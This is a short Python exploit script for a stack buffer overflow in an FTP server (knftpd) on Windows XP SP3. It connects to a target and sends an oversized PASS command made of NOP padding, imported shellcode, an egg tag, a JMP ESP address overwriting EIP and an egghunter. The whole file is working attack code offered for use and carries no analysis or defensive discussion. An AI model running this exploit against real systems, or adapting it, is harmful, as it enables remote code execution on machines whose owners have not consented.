#!/usr/bin/python
# tested on windows xp sp3
# overwrites EIP
# seh is overwritten with larger payloads
# knftpd.exe is the only non safeseh module
import sys,socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

	target = target_machine
	port = target_port

	# 271 bytes of space for shellcode
	# 227 bytes windows/exec CMD => calc.exe
	

	# 32 byte egghunter
	egghunter =(
	b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
	b"\x54\x30\x30\x57" # egg - W00T
	b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

	egg = b"\x54\x30\x30\x57\x54\x30\x30\x57"
	buffer = b"\x90" * (271 - len(egg + buf))
	eip = b"\x13\x44\x87\x7c" 	# 7C874413 JMP ESP - kernel32.dll
	nops = b"\x90" * 8

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((target,port))
		
		s.send(b"USER blake \r\n")
		s.recv(1024)
		s.send(b"PASS " + buffer + egg + buf + eip + nops + egghunter + b"\r\n")
		s.recv(1024)
		s.close()
		
		
	except:
		
		sys.exit(0)